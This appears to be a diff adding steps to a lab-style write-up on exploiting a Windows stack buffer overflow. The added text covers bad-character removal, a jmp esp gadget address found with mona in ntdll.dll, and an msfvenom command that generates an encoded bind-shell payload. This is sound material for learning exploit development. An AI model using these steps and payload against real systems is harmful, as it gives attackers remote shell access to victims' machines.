@@ -18,3 +18,14 @@ After we collect the offset, we need to do a EIP overwrite to ensure we have the
 <img width="317" height="300" alt="44124" src="https://github.com/user-attachments/assets/9bb091a5-d8bf-4bc8-a49f-e418ff0f0ad4" />
 
 We have done so. But now we need to eliminate the bad chars, otherwise we will have some serious issues.
+When you search go to your ESP in the cpu registers and scroll down to the 4 b's of the EIP overwrite and search from 00 to FF.
+I have discovered the following characters being bad: `0x0 0xA 0xD`
+
+# Getting our gadget.
+1. The first step I took was running `!mona find -s "\xFF\xE4"` this is the opcode for jmp esp -> jmp extended stack pointer.
+2. Running into some issues I didn't go back to check, but we will choose ntdll.dll for this exploit. Prior I had issues with GDI32.dll, USER32.dll.
+3. In mona click search for a sequence of commands: `jmp esp` Once that has been done you will find a address in the module ntdll.dll of `0x77f1E871` opcode: `xff xe4`
+
+# Lastly, we need to write a payload.
+This will remove the bad chars in the exploit for it to make work.
+msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LPORT=4444 -b '\x00\x0a\x0d' -f python -e x86/alpha_mixed
